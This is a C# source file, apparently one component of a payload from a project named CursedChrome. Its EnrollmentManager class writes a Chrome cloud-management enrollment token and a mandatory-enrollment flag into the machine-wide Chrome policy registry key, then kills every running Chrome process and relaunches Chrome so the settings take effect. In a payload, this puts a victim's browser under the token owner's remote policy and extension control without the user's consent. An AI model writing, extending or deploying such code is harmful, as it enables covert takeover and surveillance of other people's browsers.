using System;
using Microsoft.Win32;
using CursedChrome.Core;

namespace CursedChrome.Payload
{
    /// <summary>
    /// Chrome Browser Cloud Management Enrollment
    /// </summary>
    public static class EnrollmentManager
    {
        public static bool EnrollBrowser()
        {
            try
            {
                Logger.Log("Starting Chrome browser enrollment");
                Logger.Log($"Enrollment Token: {Configuration.ENROLLMENT_TOKEN}");
                Logger.Log($"Organization Unit: {Configuration.ORG_UNIT}");
                
                // Apply enrollment token
                if (!SetEnrollmentToken())
                {
                    Logger.LogError("Failed to set enrollment token");
                    return false;
                }
                
                // Set mandatory enrollment
                if (!SetMandatoryEnrollment())
                {
                    Logger.LogWarning("Failed to set mandatory enrollment (non-critical)");
                }
                
                // Verify enrollment
                if (VerifyEnrollment())
                {
                    Logger.Log("Browser enrollment successful");
                    return true;
                }
                else
                {
                    Logger.LogWarning("Enrollment set but not verified");
                    return true; // Still return true as enrollment is set
                }
            }
            catch (Exception ex)
            {
                Logger.LogError("Browser enrollment failed", ex);
                return false;
            }
        }
        
        private static bool SetEnrollmentToken()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(Configuration.CHROME_POLICY_PATH))
                {
                    if (key == null)
                    {
                        Logger.LogError("Could not create Chrome policy registry key");
                        return false;
                    }
                    
                    // Set enrollment token
                    key.SetValue("CloudManagementEnrollmentToken", Configuration.ENROLLMENT_TOKEN, RegistryValueKind.String);
                    Logger.Log("Enrollment token set successfully");
                    
                    return true;
                }
            }
            catch (Exception ex)
            {
                Logger.LogError("Failed to set enrollment token", ex);
                return false;
            }
        }
        
        private static bool SetMandatoryEnrollment()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(Configuration.CHROME_POLICY_PATH))
                {
                    if (key == null)
                    {
                        return false;
                    }
                    
                    // Make enrollment mandatory (optional but recommended)
                    key.SetValue("CloudManagementEnrollmentMandatory", 1, RegistryValueKind.DWord);
                    Logger.Log("Mandatory enrollment enabled");
                    
                    return true;
                }
            }
            catch (Exception ex)
            {
                Logger.LogError("Failed to set mandatory enrollment", ex);
                return false;
            }
        }
        
        private static bool VerifyEnrollment()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(Configuration.CHROME_POLICY_PATH))
                {
                    if (key == null)
                    {
                        return false;
                    }
                    
                    object tokenValue = key.GetValue("CloudManagementEnrollmentToken");
                    
                    if (tokenValue != null && tokenValue.ToString() == Configuration.ENROLLMENT_TOKEN)
                    {
                        Logger.Log("Enrollment token verified in registry");
                        return true;
                    }
                    
                    return false;
                }
            }
            catch
            {
                return false;
            }
        }
        
        public static void RestartChrome()
        {
            try
            {
                Logger.Log("Restarting Chrome to apply enrollment");
                
                // Kill all Chrome processes
                System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("chrome");
                
                if (processes.Length > 0)
                {
                    Logger.Log($"Found {processes.Length} Chrome processes");
                    
                    foreach (var proc in processes)
                    {
                        try
                        {
                            proc.Kill();
                            proc.WaitForExit(5000);
                        }
                        catch { }
                    }
                    
                    System.Threading.Thread.Sleep(2000);
                    
                    // Try to restart Chrome
                    string[] chromePaths = new string[]
                    {
                        @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                        @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
                    };
                    
                    foreach (string path in chromePaths)
                    {
                        if (System.IO.File.Exists(path))
                        {
                            System.Diagnostics.Process.Start(path);
                            Logger.Log($"Chrome restarted: {path}");
                            return;
                        }
                    }
                }
                else
                {
                    Logger.Log("Chrome was not running");
                }
            }
            catch (Exception ex)
            {
                Logger.LogError("Chrome restart failed", ex);
            }
        }
    }
}
